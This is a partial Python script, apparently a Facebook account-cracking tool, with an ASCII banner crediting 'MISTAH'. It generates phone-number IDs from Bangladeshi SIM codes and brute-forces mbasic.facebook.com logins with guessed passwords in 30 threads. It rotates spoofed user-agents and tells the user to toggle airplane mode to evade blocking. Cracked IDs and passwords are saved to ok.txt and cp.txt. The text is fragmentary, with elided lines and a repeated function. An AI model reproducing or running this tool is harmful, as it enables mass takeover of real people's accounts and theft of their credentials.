...
\033[1;32m(•)==============================================🥀
\033[1;32m[🇮🇳] \033[1;33mCREATED BY   :  \033[1;33mMISTAH
\033[1;32m[🇮🇳] \033[1;34mON FACEBOK   :  \033[1;34mMISTAHROHZZ
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[MISTAH] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
...
def random_pak_number():
	...
	os.system('clear')
	print(logo)
	print('[+] BD code  : 018,019,015,016,017')
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[?] \033[1;35mCHOICE SIM CODE : \033[1;32m'+kode)
		print('\033[1;37;1m[•] YOUR CONTORY (\033[1;92mBangladesh\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru,'Bangladesh','Freefire','Firstlast','FirstLast','First8','First6','First7','First11','First9','First10','Last6','Last7','Last8','Last9']
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
...
def rcrack(uid,pwx,tl):
    ...
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.4; LG-E987 Build/KOT49I) AppleWebKit/603.31 (KHTML, like Gecko)  Chrome/49.0.2693.122 Mobile Safari/533.2'
                           'mobile|Mozilla/5.0 (iPad; CPU iPad OS 11_0_3 like Mac OS X) AppleWebKit/533.47 (KHTML, like Gecko) Chrome/54.0.2243.350 Mobile Safari/603.9'
                           'mobile|Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_9; like Mac OS X) AppleWebKit/603.44 (KHTML, like Gecko) Chrome/48.0.3430.299 Mobile Safari/533.0'
                           'mobile|Mozilla/5.0 (Linux; U; Android 4.4.1; GT-I9306T Build/KOT49H) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/53.0.2694.294 Mobile Safari/535.5'
                           'mobile|Mozilla/5.0 (iPad; CPU iPad OS 10_9_3 like Mac OS X) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/47.0.3804.165 Mobile Safari/603.3'
                           'mobile|Mozilla/5.0 (Android; Android 4.4.4; SAMSUNG SM-T535 Build/KOT49H) AppleWebKit/600.28 (KHTML, like Gecko) Chrome/55.0.3628.326 Mobile Safari/535.0'
                           'mobile|Mozilla/5.0 (Android; Android 6.0; Nexus 7P Build/MDB08I) AppleWebKit/534.38 (KHTML, like Gecko) Chrome/52.0.2366.290 Mobile Safari/536.8'
                           'mobile|Mozilla/5.0 (Android; Android 7.0; Pixel XL Build/NME91E) AppleWebKit/602.26 (KHTML, like Gecko) Chrome/50.0.2484.246 Mobile Safari/601.4'
                           'mobile|Mozilla/5.0 (Linux; U; Android 5.0.1; LG-D332 Build/LRX22G) AppleWebKit/600.5 (KHTML, like Gecko) Chrome/51.0.1189.156 Mobile Safari/534.8'
                           'mobile|Mozilla/5.0 (iPod; CPU iPod OS 7_3_2; like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Chrome/54.0.1879.337 Mobile Safari/603.7'
                           'mobile|Mozilla/5.0 (iPad; CPU iPad OS 8_3_5 like Mac OS X) AppleWebKit/601.45 (KHTML, like Gecko) Chrome/52.0.2344.345 Mobile Safari/603.1'
			lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[MISTAH-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mMISTAH\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 
